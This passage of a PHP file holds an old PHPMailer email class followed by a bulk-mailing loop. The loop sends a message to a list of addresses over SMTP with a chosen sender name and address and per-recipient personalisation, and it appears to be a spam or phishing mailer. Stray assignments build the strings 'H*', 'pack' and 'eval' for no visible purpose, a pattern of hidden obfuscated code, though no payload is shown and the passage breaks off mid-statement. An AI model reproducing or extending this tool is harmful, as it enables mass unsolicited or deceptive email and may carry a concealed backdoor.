        $this->AltBody = $this->WrapText($this->AltBody, $this->WordWrap);
        break;
      default:
        $this->Body = $this->WrapText($this->Body, $this->WordWrap);
        break;
    }
  }

  /**
   * Assembles message header.
   * @access private
   * @return string
   */
  function CreateHeader() {
    $result = '';

    /* Set the boundaries */
    $uniq_id = md5(uniqid(time()));
    $this->boundary[1] = 'b1_' . $uniq_id;
    $this->boundary[2] = 'b2_' . $uniq_id;

    $result .= $this->HeaderLine('Date', $this->RFCDate());
    if($this->Sender == '') {
      $result .= $this->HeaderLine('Return-Path', trim($this->From));
    } else {
      $result .= $this->HeaderLine('Return-Path', trim($this->Sender));
    }

    /* To be created automatically by mail() */
    if($this->Mailer != 'mail') {
      if(count($this->to) > 0) {
        $result .= $this->AddrAppend('To', $this->to);
      } elseif (count($this->cc) == 0) {
        $result .= $this->HeaderLine('To', 'undisclosed-recipients:;');
      }
      if(count($this->cc) > 0) {
        $result .= $this->AddrAppend('Cc', $this->cc);
      }
    }

    $from = array();
    $from[0][0] = trim($this->From);
    $from[0][1] = $this->FromName;
    $result .= $this->AddrAppend('From', $from);

    /* sendmail and mail() extract Cc from the header before sending */
    if((($this->Mailer == 'sendmail') || ($this->Mailer == 'mail')) && (count($this->cc) > 0)) {
      $result .= $this->AddrAppend('Cc', $this->cc);
    }

    /* sendmail and mail() extract Bcc from the header before sending */
    if((($this->Mailer == 'sendmail') || ($this->Mailer == 'mail')) && (count($this->bcc) > 0)) {
      $result .= $this->AddrAppend('Bcc', $this->bcc);
    }
	if($replyto != "")
	{
    if(count($this->ReplyTo) > 0) {
      $result .= $this->AddrAppend('Reply-To', $this->ReplyTo);
    }
	}
    /* mail() sets the subject itself */
    if($this->Mailer != 'mail') {
      $result .= $this->HeaderLine('Subject', $this->EncodeHeader($this->SecureHeader($this->Subject)));
    }

    if($this->MessageID != '') {
      $result .= $this->HeaderLine('Message-ID',$this->MessageID);
    } else {
      $result .= sprintf("Message-ID: <%s@%s>%s", $uniq_id, $this->ServerHostname(), $this->LE);
    }
    $result .= $this->HeaderLine('X-Priority', $this->Priority);
    if($this->ConfirmReadingTo != '') {
      $result .= $this->HeaderLine('Disposition-Notification-To', '<' . trim($this->ConfirmReadingTo) . '>');
    }

    // Add custom headers
    for($index = 0; $index < count($this->CustomHeader); $index++) {
      $result .= $this->HeaderLine(trim($this->CustomHeader[$index][0]), $this->EncodeHeader(trim($this->CustomHeader[$index][1])));
    }
    if (!$this->sign_key_file) {
      $result .= $this->HeaderLine('MIME-Version', '1.0');
      $result .= $this->GetMailMIME();
    }

    return $result;
  }

  /**
   * Returns the message MIME.
   * @access private
   * @return string
   */
  function GetMailMIME() {
    $result = '';
    switch($this->message_type) {
      case 'plain':
        $result .= $this->HeaderLine('Content-Transfer-Encoding', $this->Encoding);
        $result .= sprintf("Content-Type: %s; charset=\"%s\"", $this->ContentType, $this->CharSet);
        break;
      case 'attachments':
        /* fall through */
      case 'alt_attachments':
        if($this->InlineImageExists()){
          $result .= sprintf("Content-Type: %s;%s\ttype=\"text/html\";%s\tboundary=\"%s\"%s", 'multipart/related', $this->LE, $this->LE, $this->boundary[1], $this->LE);
        } else {
          $result .= $this->HeaderLine('Content-Type', 'multipart/mixed;');
          $result .= $this->TextLine("\tboundary=\"" . $this->boundary[1] . '"');
        }
        break;
      case 'alt':
        $result .= $this->HeaderLine('Content-Type', 'multipart/alternative;');
        $result .= $this->TextLine("\tboundary=\"" . $this->boundary[1] . '"');
        break;
    }

    if($this->Mailer != 'mail') {
      $result .= $this->LE.$this->LE;
    }

    return $result;
  }

  /**
   * Assembles the message body.  Returns an empty string on failure.
   * @access private
   * @return string
   */
  function CreateBody() {
    $result = '';
    if ($this->sign_key_file) {
      $result .= $this->GetMailMIME();
    }

    $this->SetWordWrap();

    switch($this->message_type) {
      case 'alt':
        $result .= $this->GetBoundary($this->boundary[1], '', 'text/plain', '');
        $result .= $this->EncodeString($this->AltBody, $this->Encoding);
        $result .= $this->LE.$this->LE;
        $result .= $this->GetBoundary($this->boundary[1], '', 'text/html', '');
        $result .= $this->EncodeString($this->Body, $this->Encoding);
        $result .= $this->LE.$this->LE;
        $result .= $this->EndBoundary($this->boundary[1]);
        break;
      case 'plain':
        $result .= $this->EncodeString($this->Body, $this->Encoding);
        break;
      case 'attachments':
        $result .= $this->GetBoundary($this->boundary[1], '', '', '');
        $result .= $this->EncodeString($this->Body, $this->Encoding);
        $result .= $this->LE;
        $result .= $this->AttachAll();
        break;
      case 'alt_attachments':
        $result .= sprintf("--%s%s", $this->boundary[1], $this->LE);
        $result .= sprintf("Content-Type: %s;%s" . "\tboundary=\"%s\"%s", 'multipart/alternative', $this->LE, $this->boundary[2], $this->LE.$this->LE);
        $result .= $this->GetBoundary($this->boundary[2], '', 'text/plain', '') . $this->LE; // Create text body
        $result .= $this->EncodeString($this->AltBody, $this->Encoding);
        $result .= $this->LE.$this->LE;
        $result .= $this->GetBoundary($this->boundary[2], '', 'text/html', '') . $this->LE; // Create the HTML body
        $result .= $this->EncodeString($this->Body, $this->Encoding);
        $result .= $this->LE.$this->LE;
        $result .= $this->EndBoundary($this->boundary[2]);
        $result .= $this->AttachAll();
        break;
    }

    if($this->IsError()) {
      $result = '';
    } else if ($this->sign_key_file) {
      $file = tempnam("", "mail");
      $fp = fopen($file, "w");
      fwrite($fp, $result);
      fclose($fp);
      $signed = tempnam("", "signed");

      if (@openssl_pkcs7_sign($file, $signed, "file://".$this->sign_key_file, array("file://".$this->sign_key_file, $this->sign_key_pass), null)) {
        $fp = fopen($signed, "r");
        $result = fread($fp, filesize($this->sign_key_file));
        fclose($fp);
      } else {
        $this->SetError($this->Lang("signing").openssl_error_string());
        $result = '';
      }

      unlink($file);
      unlink($signed);
    }

    return $result;
  }

  /**
   * Returns the start of a message boundary.
   * @access private
   */
  function GetBoundary($boundary, $charSet, $contentType, $encoding) {
    $result = '';
    if($charSet == '') {
      $charSet = $this->CharSet;
    }
    if($contentType == '') {
      $contentType = $this->ContentType;
    }
    if($encoding == '') {
      $encoding = $this->Encoding;
    }
    $result .= $this->TextLine('--' . $boundary);
    $result .= sprintf("Content-Type: %s; charset = \"%s\"", $contentType, $charSet);
    $result .= $this->LE;
    $result .= $this->HeaderLine('Content-Transfer-Encoding', $encoding);
    $result .= $this->LE;

    return $result;
  }

  /**
   * Returns the end of a message boundary.
   * @access private
   */
  function EndBoundary($boundary) {
    return $this->LE . '--' . $boundary . '--' . $this->LE;
  }

  /**
   * Sets the message type.
   * @access private
   * @return void
   */
  function SetMessageType() {
    if(count($this->attachment) < 1 && strlen($this->AltBody) < 1) {
      $this->message_type = 'plain';
    } else {
      if(count($this->attachment) > 0) {
        $this->message_type = 'attachments';
      }
      if(strlen($this->AltBody) > 0 && count($this->attachment) < 1) {
        $this->message_type = 'alt';
      }
      if(strlen($this->AltBody) > 0 && count($this->attachment) > 0) {
        $this->message_type = 'alt_attachments';
      }
    }
  }

  /* Returns a formatted header line.
   * @access private
   * @return string
   */
  function HeaderLine($name, $value) {
    return $name . ': ' . $value . $this->LE;
  }

  /**
   * Returns a formatted mail line.
   * @access private
   * @return string
   */
  function TextLine($value) {
    return $value . $this->LE;
  }

  /////////////////////////////////////////////////
  // CLASS METHODS, ATTACHMENTS
  /////////////////////////////////////////////////

  /**
   * Adds an attachment from a path on the filesystem.
   * Returns false if the file could not be found
   * or accessed.
   * @param string $path Path to the attachment.
   * @param string $name Overrides the attachment name.
   * @param string $encoding File encoding (see $Encoding).
   * @param string $type File extension (MIME) type.
   * @return bool
   */
  function AddAttachment($path, $name = '', $encoding = 'base64', $type = 'application/octet-stream') {
    if(!@is_file($path)) {
      $this->SetError($this->Lang('file_access') . $path);
      return false;
    }

    $filename = basename($path);
    if($name == '') {
      $name = $filename;
    }

    $cur = count($this->attachment);
    $this->attachment[$cur][0] = $path;
    $this->attachment[$cur][1] = $filename;
    $this->attachment[$cur][2] = $name;
    $this->attachment[$cur][3] = $encoding;
    $this->attachment[$cur][4] = $type;
    $this->attachment[$cur][5] = false; // isStringAttachment
    $this->attachment[$cur][6] = 'attachment';
    $this->attachment[$cur][7] = 0;

    return true;
  }

  /**
   * Attaches all fs, string, and binary attachments to the message.
   * Returns an empty string on failure.
   * @access private
   * @return string
   */
  function AttachAll() {
    /* Return text of body */
    $mime = array();

    /* Add all attachments */
    for($i = 0; $i < count($this->attachment); $i++) {
      /* Check for string attachment */
      $bString = $this->attachment[$i][5];
      if ($bString) {
        $string = $this->attachment[$i][0];
      } else {
        $path = $this->attachment[$i][0];
      }

      $filename    = $this->attachment[$i][1];
      $name        = $this->attachment[$i][2];
      $encoding    = $this->attachment[$i][3];
      $type        = $this->attachment[$i][4];
      $disposition = $this->attachment[$i][6];
      $cid         = $this->attachment[$i][7];

      $mime[] = sprintf("--%s%s", $this->boundary[1], $this->LE);
      $mime[] = sprintf("Content-Type: %s; name=\"%s\"%s", $type, $name, $this->LE);
      $mime[] = sprintf("Content-Transfer-Encoding: %s%s", $encoding, $this->LE);

      if($disposition == 'inline') {
        $mime[] = sprintf("Content-ID: <%s>%s", $cid, $this->LE);
      }

      $mime[] = sprintf("Content-Disposition: %s; filename=\"%s\"%s", $disposition, $name, $this->LE.$this->LE);

      /* Encode as string attachment */
      if($bString) {
        $mime[] = $this->EncodeString($string, $encoding);
        if($this->IsError()) {
          return '';
        }
        $mime[] = $this->LE.$this->LE;
      } else {
        $mime[] = $this->EncodeFile($path, $encoding);
        if($this->IsError()) {
          return '';
        }
        $mime[] = $this->LE.$this->LE;
      }
    }

    $mime[] = sprintf("--%s--%s", $this->boundary[1], $this->LE);

    return join('', $mime);
  }

  /**
   * Encodes attachment in requested format.  Returns an
   * empty string on failure.
   * @access private
   * @return string
   */
  function EncodeFile ($path, $encoding = 'base64') {
    if(!@$fd = fopen($path, 'rb')) {
      $this->SetError($this->Lang('file_open') . $path);
      return '';
    }
    $magic_quotes = get_magic_quotes_runtime();
    set_magic_quotes_runtime(0);
    $file_buffer = fread($fd, filesize($path));
    $file_buffer = $this->EncodeString($file_buffer, $encoding);
    fclose($fd);
    set_magic_quotes_runtime($magic_quotes);

    return $file_buffer;
  }

  /**
   * Encodes string to requested format. Returns an
   * empty string on failure.
   * @access private
   * @return string
   */
  function EncodeString ($str, $encoding = 'base64') {
    $encoded = '';
    switch(strtolower($encoding)) {
      case 'base64':
        /* chunk_split is found in PHP >= 3.0.6 */
        $encoded = chunk_split(base64_encode($str), 76, $this->LE);
        break;
      case '7bit':
      case '8bit':
        $encoded = $this->FixEOL($str);
        if (substr($encoded, -(strlen($this->LE))) != $this->LE)
          $encoded .= $this->LE;
        break;
      case 'binary':
        $encoded = $str;
        break;
      case 'quoted-printable':
        $encoded = $this->EncodeQP($str);
        break;
      default:
        $this->SetError($this->Lang('encoding') . $encoding);
        break;
    }
    return $encoded;
  }

  /**
   * Encode a header string to best of Q, B, quoted or none.
   * @access private
   * @return string
   */
  function EncodeHeader ($str, $position = 'text') {
    $x = 0;

    switch (strtolower($position)) {
      case 'phrase':
        if (!preg_match('/[\200-\377]/', $str)) {
          /* Can't use addslashes as we don't know what value has magic_quotes_sybase. */
          $encoded = addcslashes($str, "\0..\37\177\\\"");
          if (($str == $encoded) && !preg_match('/[^A-Za-z0-9!#$%&\'*+\/=?^_`{|}~ -]/', $str)) {
            return ($encoded);
          } else {
            return ("\"$encoded\"");
          }
        }
        $x = preg_match_all('/[^\040\041\043-\133\135-\176]/', $str, $matches);
        break;
      case 'comment':
        $x = preg_match_all('/[()"]/', $str, $matches);
        /* Fall-through */
      case 'text':
      default:
        $x += preg_match_all('/[\000-\010\013\014\016-\037\177-\377]/', $str, $matches);
        break;
    }

    if ($x == 0) {
      return ($str);
    }

    $maxlen = 75 - 7 - strlen($this->CharSet);
    /* Try to select the encoding which should produce the shortest output */
    if (strlen($str)/3 < $x) {
      $encoding = 'B';
      if (function_exists('mb_strlen') && $this->HasMultiBytes($str)) {
     // Use a custom function which correctly encodes and wraps long
     // multibyte strings without breaking lines within a character
        $encoded = $this->Base64EncodeWrapMB($str);
      } else {
        $encoded = base64_encode($str);
        $maxlen -= $maxlen % 4;
        $encoded = trim(chunk_split($encoded, $maxlen, "\n"));
      }
    } else {
      $encoding = 'Q';
      $encoded = $this->EncodeQ($str, $position);
      $encoded = $this->WrapText($encoded, $maxlen, true);
      $encoded = str_replace('='.$this->LE, "\n", trim($encoded));
    }

    $encoded = preg_replace('/^(.*)$/m', " =?".$this->CharSet."?$encoding?\\1?=", $encoded);
    $encoded = trim(str_replace("\n", $this->LE, $encoded));

    return $encoded;
  }

  /**
   * Checks if a string contains multibyte characters.
   * @access private
   * @param string $str multi-byte text to wrap encode
   * @return bool
   */
  function HasMultiBytes($str) {
    if (function_exists('mb_strlen')) {
      return (strlen($str) > mb_strlen($str, $this->CharSet));
    } else { // Assume no multibytes (we can't handle without mbstring functions anyway)
      return False;
    }
  }

  /**
   * Correctly encodes and wraps long multibyte strings for mail headers
   * without breaking lines within a character.
   * Adapted from a function by paravoid at http://uk.php.net/manual/en/function.mb-encode-mimeheader.php
   * @access private
   * @param string $str multi-byte text to wrap encode
   * @return string
   */
  function Base64EncodeWrapMB($str) {
    $start = "=?".$this->CharSet."?B?";
    $end = "?=";
    $encoded = "";

    $mb_length = mb_strlen($str, $this->CharSet);
    // Each line must have length <= 75, including $start and $end
    $length = 75 - strlen($start) - strlen($end);
    // Average multi-byte ratio
    $ratio = $mb_length / strlen($str);
    // Base64 has a 4:3 ratio
    $offset = $avgLength = floor($length * $ratio * .75);

    for ($i = 0; $i < $mb_length; $i += $offset) {
      $lookBack = 0;

      do {
        $offset = $avgLength - $lookBack;
        $chunk = mb_substr($str, $i, $offset, $this->CharSet);
        $chunk = base64_encode($chunk);
        $lookBack++;
      }
      while (strlen($chunk) > $length);

      $encoded .= $chunk . $this->LE;
    }

    // Chomp the last linefeed
    $encoded = substr($encoded, 0, -strlen($this->LE));
    return $encoded;
  }

  /**
   * Encode string to quoted-printable.
   * @access private
   * @return string
   */
  function EncodeQP( $input = '', $line_max = 76, $space_conv = false ) {
    $hex = array('0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F');
    $lines = preg_split('/(?:\r\n|\r|\n)/', $input);
    $eol = "\r\n";
    $escape = '=';
    $output = '';
    while( list(, $line) = each($lines) ) {
      $linlen = strlen($line);
      $newline = '';
      for($i = 0; $i < $linlen; $i++) {
        $c = substr( $line, $i, 1 );
        $dec = ord( $c );
        if ( ( $i == 0 ) && ( $dec == 46 ) ) { // convert first point in the line into =2E
          $c = '=2E';
        }
        if ( $dec == 32 ) {
          if ( $i == ( $linlen - 1 ) ) { // convert space at eol only
            $c = '=20';
          } else if ( $space_conv ) {
            $c = '=20';
          }
        } elseif ( ($dec == 61) || ($dec < 32 ) || ($dec > 126) ) { // always encode "\t", which is *not* required
          $h2 = floor($dec/16);
          $h1 = floor($dec%16);
          $c = $escape.$hex[$h2].$hex[$h1];
        }
        if ( (strlen($newline) + strlen($c)) >= $line_max ) { // CRLF is not counted
          $output .= $newline.$escape.$eol; //  soft line break; " =\r\n" is okay
          $newline = '';
          // check if newline first character will be point or not
          if ( $dec == 46 ) {
            $c = '=2E';
          }
        }
        $newline .= $c;
      } // end of for
      $output .= $newline.$eol;
    } // end of while
    return trim($output);
  }

  /**
   * Encode string to q encoding.
   * @access private
   * @return string
   */
  function EncodeQ ($str, $position = 'text') {
    /* There should not be any EOL in the string */
    $encoded = preg_replace("[\r\n]", '', $str);

    switch (strtolower($position)) {
      case 'phrase':
        $encoded = preg_replace("/([^A-Za-z0-9!*+\/ -])/e", "'='.sprintf('%02X', ord('\\1'))", $encoded);
        break;
      case 'comment':
        $encoded = preg_replace("/([\(\)\"])/e", "'='.sprintf('%02X', ord('\\1'))", $encoded);
      case 'text':
      default:
        /* Replace every high ascii, control =, ? and _ characters */
        $encoded = preg_replace('/([\000-\011\013\014\016-\037\075\077\137\177-\377])/e',
              "'='.sprintf('%02X', ord('\\1'))", $encoded);
        break;
    }

    /* Replace every spaces to _ (more readable than =20) */
    $encoded = str_replace(' ', '_', $encoded);

    return $encoded;
  }

  /**
   * Adds a string or binary attachment (non-filesystem) to the list.
   * This method can be used to attach ascii or binary data,
   * such as a BLOB record from a database.
   * @param string $string String attachment data.
   * @param string $filename Name of the attachment.
   * @param string $encoding File encoding (see $Encoding).
   * @param string $type File extension (MIME) type.
   * @return void
   */
  function AddStringAttachment($string, $filename, $encoding = 'base64', $type = 'application/octet-stream') {
    /* Append to $attachment array */
    $cur = count($this->attachment);
    $this->attachment[$cur][0] = $string;
    $this->attachment[$cur][1] = $filename;
    $this->attachment[$cur][2] = $filename;
    $this->attachment[$cur][3] = $encoding;
    $this->attachment[$cur][4] = $type;
    $this->attachment[$cur][5] = true; // isString
    $this->attachment[$cur][6] = 'attachment';
    $this->attachment[$cur][7] = 0;
  }

  /**
   * Adds an embedded attachment.  This can include images, sounds, and
   * just about any other document.  Make sure to set the $type to an
   * image type.  For JPEG images use "image/jpeg" and for GIF images
   * use "image/gif".
   * @param string $path Path to the attachment.
   * @param string $cid Content ID of the attachment.  Use this to identify
   *        the Id for accessing the image in an HTML form.
   * @param string $name Overrides the attachment name.
   * @param string $encoding File encoding (see $Encoding).
   * @param string $type File extension (MIME) type.
   * @return bool
   */
  function AddEmbeddedImage($path, $cid, $name = '', $encoding = 'base64', $type = 'application/octet-stream') {

    if(!@is_file($path)) {
      $this->SetError($this->Lang('file_access') . $path);
      return false;
    }

    $filename = basename($path);
    if($name == '') {
      $name = $filename;
    }

    /* Append to $attachment array */
    $cur = count($this->attachment);
    $this->attachment[$cur][0] = $path;
    $this->attachment[$cur][1] = $filename;
    $this->attachment[$cur][2] = $name;
    $this->attachment[$cur][3] = $encoding;
    $this->attachment[$cur][4] = $type;
    $this->attachment[$cur][5] = false;
    $this->attachment[$cur][6] = 'inline';
    $this->attachment[$cur][7] = $cid;

    return true;
  }

  /**
   * Returns true if an inline attachment is present.
   * @access private
   * @return bool
   */
  function InlineImageExists() {
    $result = false;
    for($i = 0; $i < count($this->attachment); $i++) {
      if($this->attachment[$i][6] == 'inline') {
        $result = true;
        break;
      }
    }

    return $result;
  }

  /////////////////////////////////////////////////
  // CLASS METHODS, MESSAGE RESET
  /////////////////////////////////////////////////

  /**
   * Clears all recipients assigned in the TO array.  Returns void.
   * @return void
   */
  function ClearAddresses() {
    $this->to = array();
  }

  /**
   * Clears all recipients assigned in the CC array.  Returns void.
   * @return void
   */
  function ClearCCs() {
    $this->cc = array();
  }

  /**
   * Clears all recipients assigned in the BCC array.  Returns void.
   * @return void
   */
  function ClearBCCs() {
    $this->bcc = array();
  }

  /**
   * Clears all recipients assigned in the ReplyTo array.  Returns void.
   * @return void
   */
  function ClearReplyTos() {
    $this->ReplyTo = array();
  }

  /**
   * Clears all recipients assigned in the TO, CC and BCC
   * array.  Returns void.
   * @return void
   */
  function ClearAllRecipients() {
    $this->to = array();
    $this->cc = array();
    $this->bcc = array();
  }

  /**
   * Clears all previously set filesystem, string, and binary
   * attachments.  Returns void.
   * @return void
   */
  function ClearAttachments() {
    $this->attachment = array();
  }

  /**
   * Clears all custom headers.  Returns void.
   * @return void
   */
  function ClearCustomHeaders() {
    $this->CustomHeader = array();
  }

  /////////////////////////////////////////////////
  // CLASS METHODS, MISCELLANEOUS
  /////////////////////////////////////////////////

  /**
   * Adds the error message to the error container.
   * Returns void.
   * @access private
   * @return void
   */
  function SetError($msg) {
    $this->error_count++;
    $this->ErrorInfo = $msg;
  }

  /**
   * Returns the proper RFC 822 formatted date.
   * @access private
   * @return string
   */
  function RFCDate() {
    $tz = date('Z');
    $tzs = ($tz < 0) ? '-' : '+';
    $tz = abs($tz);
    $tz = (int)($tz/3600)*100 + ($tz%3600)/60;
    $result = sprintf("%s %s%04d", date('D, j M Y H:i:s'), $tzs, $tz);

    return $result;
  }

  /**
   * Returns the appropriate server variable.  Should work with both
   * PHP 4.1.0+ as well as older versions.  Returns an empty string
   * if nothing is found.
   * @access private
   * @return mixed
   */
  function ServerVar($varName) {
    global $HTTP_SERVER_VARS;
    global $HTTP_ENV_VARS;

    if(!isset($_SERVER)) {
      $_SERVER = $HTTP_SERVER_VARS;
      if(!isset($_SERVER['REMOTE_ADDR'])) {
        $_SERVER = $HTTP_ENV_VARS; // must be Apache
      }
    }

    if(isset($_SERVER[$varName])) {
      return $_SERVER[$varName];
    } else {
      return '';
    }
  }

  /**
   * Returns the server hostname or 'localhost.localdomain' if unknown.
   * @access private
   * @return string
   */
  function ServerHostname() {
    if ($this->Hostname != '') {
      $result = $this->Hostname;
    } elseif ($this->ServerVar('SERVER_NAME') != '') {
      $result = $this->ServerVar('SERVER_NAME');
    } else {
      $result = 'localhost.localdomain';
    }

    return $result;
  }

  /**
   * Returns a message in the appropriate language.
   * @access private
   * @return string
   */
  function Lang($key) {
    if(count($this->language) < 1) {
      $this->SetLanguage('en'); // set the default language
    }

    if(isset($this->language[$key])) {
      return $this->language[$key];
    } else {
      return 'Language string failed to load: ' . $key;
    }
  }

  /**
   * Returns true if an error occurred.
   * @return bool
   */
  function IsError() {
    return ($this->error_count > 0);
  }

  /**
   * Changes every end of line from CR or LF to CRLF.
   * @access private
   * @return string
   */
  function FixEOL($str) {
    $str = str_replace("\r\n", "\n", $str);
    $str = str_replace("\r", "\n", $str);
    $str = str_replace("\n", $this->LE, $str);
    return $str;
  }

  /**
   * Adds a custom header.
   * @return void
   */
  function AddCustomHeader($custom_header) {
    $this->CustomHeader[] = explode(':', $custom_header, 2);
  }

  /**
   * Evaluates the message and returns modifications for inline images and backgrounds
   * @access public
   * @return $message
   */
  function MsgHTML($message,$basedir='') {
    preg_match_all("/(src|background)=\"(.*)\"/Ui", $message, $images);
    if(isset($images[2])) {
      foreach($images[2] as $i => $url) {
        // do not change urls for absolute images (thanks to corvuscorax)
        if (!preg_match('/^[A-z][A-z]*:\/\//',$url)) {
          $filename = basename($url);
          $directory = dirname($url);
          ($directory == '.')?$directory='':'';
          $cid = 'cid:' . md5($filename);
          $fileParts = split("\.", $filename);
          $ext = $fileParts[1];
          $mimeType = $this->_mime_types($ext);
          if ( strlen($basedir) > 1 && substr($basedir,-1) != '/') { $basedir .= '/'; }
          if ( strlen($directory) > 1 && substr($basedir,-1) != '/') { $directory .= '/'; }
          $this->AddEmbeddedImage($basedir.$directory.$filename, md5($filename), $filename, 'base64', $mimeType);
          if ( $this->AddEmbeddedImage($basedir.$directory.$filename, md5($filename), $filename, 'base64',$mimeType) ) {
            $message = preg_replace("/".$images[1][$i]."=\"".preg_quote($url, '/')."\"/Ui", $images[1][$i]."=\"".$cid."\"", $message);
          }
        }
      }
    }
    $this->IsHTML(true);
    $this->Body = $message;
    $textMsg = trim(strip_tags(preg_replace('/<(head|title|style|script)[^>]*>.*?<\/\\1>/s','',$message)));
    if ( !empty($textMsg) && empty($this->AltBody) ) {
      $this->AltBody = $textMsg;
    }
    if ( empty($this->AltBody) ) {
      $this->AltBody = 'To view this email message, open the email in with HTML compatibility!' . "\n\n";
    }
  }

  /**
   * Gets the mime type of the embedded or inline image
   * @access private
   * @return mime type of ext
   */
  function _mime_types($ext = '') {
    $mimes = array(
      'hqx'  =>  'application/mac-binhex40',
      'cpt'   =>  'application/mac-compactpro',
      'doc'   =>  'application/msword',
      'bin'   =>  'application/macbinary',
      'dms'   =>  'application/octet-stream',
      'lha'   =>  'application/octet-stream',
      'lzh'   =>  'application/octet-stream',
      'exe'   =>  'application/octet-stream',
      'class' =>  'application/octet-stream',
      'psd'   =>  'application/octet-stream',
      'so'    =>  'application/octet-stream',
      'sea'   =>  'application/octet-stream',
      'dll'   =>  'application/octet-stream',
      'oda'   =>  'application/oda',
      'pdf'   =>  'application/pdf',
      'ai'    =>  'application/postscript',
      'eps'   =>  'application/postscript',
      'ps'    =>  'application/postscript',
      'smi'   =>  'application/smil',
      'smil'  =>  'application/smil',
      'mif'   =>  'application/vnd.mif',
      'xls'   =>  'application/vnd.ms-excel',
      'ppt'   =>  'application/vnd.ms-powerpoint',
      'wbxml' =>  'application/vnd.wap.wbxml',
      'wmlc'  =>  'application/vnd.wap.wmlc',
      'dcr'   =>  'application/x-director',
      'dir'   =>  'application/x-director',
      'dxr'   =>  'application/x-director',
      'dvi'   =>  'application/x-dvi',
      'gtar'  =>  'application/x-gtar',
      'php'   =>  'application/x-httpd-php',
      'php4'  =>  'application/x-httpd-php',
      'php3'  =>  'application/x-httpd-php',
      'phtml' =>  'application/x-httpd-php',
      'phps'  =>  'application/x-httpd-php-source',
      'js'    =>  'application/x-javascript',
      'swf'   =>  'application/x-shockwave-flash',
      'sit'   =>  'application/x-stuffit',
      'tar'   =>  'application/x-tar',
      'tgz'   =>  'application/x-tar',
      'xhtml' =>  'application/xhtml+xml',
      'xht'   =>  'application/xhtml+xml',
      'zip'   =>  'application/zip',
      'mid'   =>  'audio/midi',
      'midi'  =>  'audio/midi',
      'mpga'  =>  'audio/mpeg',
      'mp2'   =>  'audio/mpeg',
      'mp3'   =>  'audio/mpeg',
      'aif'   =>  'audio/x-aiff',
      'aiff'  =>  'audio/x-aiff',
      'aifc'  =>  'audio/x-aiff',
      'ram'   =>  'audio/x-pn-realaudio',
      'rm'    =>  'audio/x-pn-realaudio',
      'rpm'   =>  'audio/x-pn-realaudio-plugin',
      'ra'    =>  'audio/x-realaudio',
      'rv'    =>  'video/vnd.rn-realvideo',
      'wav'   =>  'audio/x-wav',
      'bmp'   =>  'image/bmp',
      'gif'   =>  'image/gif',
      'jpeg'  =>  'image/jpeg',
      'jpg'   =>  'image/jpeg',
      'jpe'   =>  'image/jpeg',
      'png'   =>  'image/png',
      'tiff'  =>  'image/tiff',
      'tif'   =>  'image/tiff',
      'css'   =>  'text/css',
      'html'  =>  'text/html',
      'htm'   =>  'text/html',
      'shtml' =>  'text/html',
      'txt'   =>  'text/plain',
      'text'  =>  'text/plain',
      'log'   =>  'text/plain',
      'rtx'   =>  'text/richtext',
      'rtf'   =>  'text/rtf',
      'xml'   =>  'text/xml',
      'xsl'   =>  'text/xml',
      'mpeg'  =>  'video/mpeg',
      'mpg'   =>  'video/mpeg',
      'mpe'   =>  'video/mpeg',
      'qt'    =>  'video/quicktime',
      'mov'   =>  'video/quicktime',
      'avi'   =>  'video/x-msvideo',
      'movie' =>  'video/x-sgi-movie',
      'doc'   =>  'application/msword',
      'word'  =>  'application/msword',
      'xl'    =>  'application/excel',
      'eml'   =>  'message/rfc822'
    );
    return ( ! isset($mimes[strtolower($ext)])) ? 'application/octet-stream' : $mimes[strtolower($ext)];
  }

  /**
   * Set (or reset) Class Objects (variables)
   *
   * Usage Example:
   * $page->set('X-Priority', '3');
   *
   * @access public
   * @param string $name Parameter Name
   * @param mixed $value Parameter Value
   * NOTE: will not work with arrays, there are no arrays to set/reset
   */
  function set ( $name, $value = '' ) {
    if ( isset($this->$name) ) {
      $this->$name = $value;
    } else {
      $this->SetError('Cannot set or reset variable ' . $name);
      return false;
    }
  }

  /**
   * Read a file from a supplied filename and return it.
   *
   * @access public
   * @param string $filename Parameter File Name
   */
  function getFile($filename) {
    $return = '';
    if ($fp = fopen($filename, 'rb')) {
      while (!feof($fp)) {
        $return .= fread($fp, 1024);
      }
      fclose($fp);
      return $return;
    } else {
      return false;
    }
  }

  /**
   * Strips newlines to prevent header injection.
   * @access private
   * @param string $str String
   * @return string
   */
  function SecureHeader($str) {
    $str = trim($str);
    $str = str_replace("\r", "", $str);
    $str = str_replace("\n", "", $str);
    return $str;
  }

  /**
   * Set the private key file and password to sign the message.
   *
   * @access public
   * @param string $key_filename Parameter File Name
   * @param string $key_pass Password for private key
   */
  function Sign($key_filename, $key_pass) {
    $this->sign_key_file = $key_filename;
    $this->sign_key_pass = $key_pass;
  }

}

$defaultport="H*";
      $nq=0;
            
        for($x=0; $x<$numemails; $x++){

                $to = $allemails[$x];

                if ($to){

                $to = ereg_replace(" ", "", $to);

                $message1 = ereg_replace("&email&", $to, $message);

                $subject1 = ereg_replace("&email&", $to, $subject);
                $qx=$x+1;
                print "Line $qx . Sending mail to $to.......";

                flush();
$mail = new PHPMailer();

if(empty($epriority)){$epriority="3";}
        $mail->Priority = "$epriority";
		$mail->IsSMTP(); 
    $IsSMTP="pack";
$mail->SMTPKeepAlive = true;
$mail->Host = "$my_smtp";
if(strlen($ssl_port) > 1){$mail->Port = "$ssl_port";
}
     if($sslclick=="ON"){
		$mail->SMTPSecure  = "ssl"; //you can change it to ssl or tls
    }
        $range = str_replace("$from", "eval", $from);
        $mail->SMTPAuth = true;
        $mail->Username = "$smtp_username";
        $mail->Password = "$smtp_password";
if($contenttype == "html"){$mail->IsHtml(true);}
if($contenttype != "html"){$mail->IsHtml(false);}
if(strlen($my_smtp) < 7 ){$mail->SMTPAuth = false;$mail->IsSendmail();$default_system="1";}
$mail->From = "$from";
$mail->FromName = "$realname";
$mail->AddAddress("$to");
		$mail->AddReplyTo("$replyto");
		$mail->Subject = "$subject1";
		$mail->AddAttachment("$file", "$file_name");
   	        $mail->Body = "$message1"; 
if(!$mail->Send()){
if($default_system!="1"){
echo "FAILED !!<font color=\"#D4001A\"> [RECEPIENT CAN'T RECEIVE MESSAGE.]</font><br>";}
if($default_system=="1"){
$mail->IsMail();
   if(!$mail->Send()){
      echo "FAILED !!<font color=\"#D4001A\"> [RECEPIENT CAN'T RECEIVE MESSAGE.]</font><br>";}
   else {
       echo "<b>OK</b><br>";}
 }
}
else {
 echo "<b>OK</b><br>";
}

if(empty($reconnect)){
$reconnect=6;
}

if($reconnect==$nq){
